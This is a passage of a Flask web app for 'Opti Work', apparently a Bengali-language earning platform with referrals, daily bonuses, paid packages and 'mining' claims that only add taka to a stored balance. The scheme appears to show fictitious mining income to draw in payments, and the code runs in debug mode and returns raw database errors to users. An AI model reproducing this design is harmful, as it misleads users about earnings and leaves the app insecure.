                }).execute()
                
                if referrer_id:
                    existing_refs = supabase.table("referrals").select("id").eq("referrer_id", referrer_id).execute().data
                    ref_count = len(existing_refs)
                    
                    if ref_count == 0:
                        delay_hours = 1
                    elif ref_count == 1:
                        delay_hours = 24
                    elif ref_count == 2:
                        delay_hours = 40
                    else:
                        delay_hours = 42
                        
                    scheduled_time = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=delay_hours)
                    
                    supabase.table("referrals").insert({
                        "referrer_id": referrer_id,
                        "referred_id": new_user_id,
                        "status": "Processing",
                        "scheduled_payout_at": scheduled_time.isoformat()
                    }).execute()
                        
                flash("নিবন্ধন সফল হয়েছে। লগইন করুন।", "success")
                return redirect(url_for('login'))
        except Exception:
            flash("ইউজারনেম অথবা ইমেইলটি ইতিমধ্যে ব্যবহৃত হয়েছে।", "danger")
            
    return render_template('register.html', ref_by=ref_by)



@app.route('/claim-daily', methods=['POST'])
def claim_daily():
    user_id = session.get('user_id')
    if not user_id:
        return jsonify({"status": "error", "message": "Unauthorized"}), 401
        
    try:
        user_query = supabase.table("users").select("last_daily_checkin").eq("id", user_id).execute()
        if not user_query.data:
            return jsonify({"status": "error", "message": "ব্যবহারকারী সনাক্ত করা যায়নি।"}), 404
            
        user = user_query.data[0]
        last_checkin_str = user.get('last_daily_checkin')
        
        now = datetime.datetime.now(datetime.timezone.utc)
        reward_amount = 5.00
        
        if last_checkin_str:
            last_checkin = datetime.datetime.fromisoformat(last_checkin_str.replace('Z', '+00:00'))
            cooldown = datetime.timedelta(hours=24)
            
            if now < last_checkin + cooldown:
                time_left = (last_checkin + cooldown) - now
                seconds_left = int(time_left.total_seconds())
                return jsonify({
                    "status": "error", 
                    "message": "আপনি ইতিমধ্যে আজকের ডেইলি বোনাস ক্লেইম করেছেন।"
                }), 400

        supabase.table("users").update({"last_daily_checkin": now.isoformat()}).eq("id", user_id).execute()
        supabase.rpc("increment_balance", {"user_id": user_id, "amount": reward_amount}).execute()
        
        return jsonify({
            "status": "success", 
            "message": f"ডেইলি চেক-ইন সফল! আপনার ব্যালেন্সে ৳ {reward_amount} যোগ করা হয়েছে।"
        })
    except Exception as e:
        return jsonify({"status": "error", "message": f"ডাটাবেজ ত্রুটি: {str(e)}"}), 500

@app.route('/dashboard')
def dashboard():
    user_id = session.get('user_id')
    if not user_id:
        return redirect(url_for('login'))
        
    now = datetime.datetime.now(datetime.timezone.utc)
    
    supabase.table("user_packages").delete().eq("user_id", user_id).lt("expires_at", now.isoformat()).execute()
        
    user = supabase.table("users").select("*").eq("id", user_id).execute().data[0]
    balance = float(user['balance'])
    
    is_daily_eligible = True
    last_checkin_str = user.get('last_daily_checkin')
    if last_checkin_str:
        last_checkin = datetime.datetime.fromisoformat(last_checkin_str.replace('Z', '+00:00'))
        cooldown = datetime.timedelta(hours=24)
        if now < last_checkin + cooldown:
            is_daily_eligible = False
    
    owned_pkgs = supabase.table("user_packages") \
        .select("id, last_claimed_at, expires_at, packages(name, duration_hours, yield_amount, is_premium)") \
        .eq("user_id", user_id).execute().data
        
    has_premium_pkg = any(p['packages']['is_premium'] for p in owned_pkgs if p.get('packages'))
    success_refs_query = supabase.table("referrals").select("id").eq("referrer_id", user_id).eq("status", "Success").execute().data
    success_ref_count = len(success_refs_query)
    
    ref_progress = 50 if (success_ref_count >= 3 or has_premium_pkg) else min(success_ref_count / 3, 1.0) * 50
    bal_progress = min(balance / 300, 1.0) * 50
    progress_percent = int(ref_progress + bal_progress)

    notice = "Opti Work এ আপনাকে স্বাগতম! ফ্রি মাইনিং চালু করে প্রতি ৮ ঘণ্টায় ৭ টাকা ক্লেইম করুন। প্রিমিয়াম প্যাকেজ কিনলে আয় আরও বৃদ্ধি পাবে।"

    return render_template('dashboard.html', 
                           user=user, 
                           owned_packages=owned_pkgs, 
                           notice=notice,
                           progress_percent=progress_percent,
                           is_daily_eligible=is_daily_eligible)


@app.route('/buy-package', methods=['POST'])
def buy_package():
    user_id = session.get('user_id')
    package_id = request.form.get('package_id')
    if not user_id:
        return redirect(url_for('login'))
        
    pkg = supabase.table("packages").select("*").eq("id", package_id).execute()
    if not pkg.data:
        flash("প্যাকেজ পাওয়া যায়নি।", "danger")
        return redirect(url_for('store'))
        
    cost = float(pkg.data[0]['cost'])
    pkg_name = pkg.data[0]['name']
    
    user = supabase.table("users").select("balance").eq("id", user_id).execute().data[0]
    balance = float(user['balance'])
    
    if balance >= cost:
        supabase.table("user_packages").delete().eq("user_id", user_id).eq("package_id", 1).execute()
        
        supabase.rpc("increment_balance", {"user_id": user_id, "amount": -cost}).execute()
        
        expiry_date = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=30)
        
        supabase.table("user_packages").insert({
            "user_id": user_id,
            "package_id": package_id,
            "last_claimed_at": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "expires_at": expiry_date.isoformat()
        }).execute()
        
        flash(f"{pkg_name} প্যাকেজটি সফলভাবে সক্রিয় করা হয়েছে। মেয়াদ ৩০ দিন।", "success")
    else:
        shortage = cost - balance
        flash(f"ব্যালেন্স অপর্যাপ্ত! {pkg_name} প্যাকেজটি কিনতে আপনার আরও ৳ {shortage:.2f} লাগবে। দয়া করে এড মানি করুন।", "danger")
        
    return redirect(url_for('store'))


@app.route('/claim-mining', methods=['POST'])
def claim_mining():
    user_id = session.get('user_id')
    if not user_id:
        return jsonify({"status": "error", "message": "Unauthorized"}), 401
        
    user_package_id = request.json.get('user_package_id')
    if not user_package_id:
        return jsonify({"status": "error", "message": "অবৈধ মাইনিং রিকোয়েস্ট।"}), 400
        
    pkg_query = supabase.table("user_packages") \
        .select("id, last_claimed_at, expires_at, packages(yield_amount, duration_hours)") \
        .eq("id", user_package_id).eq("user_id", user_id).execute().data
        
    if not pkg_query:
        return jsonify({"status": "error", "message": "প্যাকেজটি পাওয়া যায়নি বা মেয়াদ শেষ হয়ে গেছে।"}), 404
        
    record = pkg_query[0]
    now = datetime.datetime.now(datetime.timezone.utc)
    
    if record.get('expires_at'):
        expires_at = datetime.datetime.fromisoformat(record['expires_at'].replace('Z', '+00:00'))
        if now > expires_at:
            supabase.table("user_packages").delete().eq("id", user_package_id).execute()
            return jsonify({"status": "error", "message": "এই মাইনিং প্যাকেজটির মেয়াদ শেষ হয়ে গেছে।"}), 400
            
    last_claim = datetime.datetime.fromisoformat(record['last_claimed_at'].replace('Z', '+00:00'))
    cooldown = datetime.timedelta(hours=record['packages']['duration_hours'])
    
    if now >= last_claim + cooldown:
        supabase.table("user_packages").update({"last_claimed_at": now.isoformat()}).eq("id", user_package_id).execute()
        yield_amount = float(record['packages']['yield_amount'])
        supabase.rpc("increment_balance", {"user_id": user_id, "amount": yield_amount}).execute()
        
        return jsonify({"status": "success", "message": f"৳ {yield_amount} সফলভাবে ক্লেইমড!"})
    else:
        return jsonify({"status": "error", "message": "এই নোডের মাইনিং প্রসেস এখনও সম্পন্ন হয়নি।"})


# (অন্যান্য কোড অপরিবর্তিত থাকবে, /referrals এবং /profile রাউট দুটি প্রতিস্থাপন করুন)

# ৮. লগআউট
@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(debug=True)
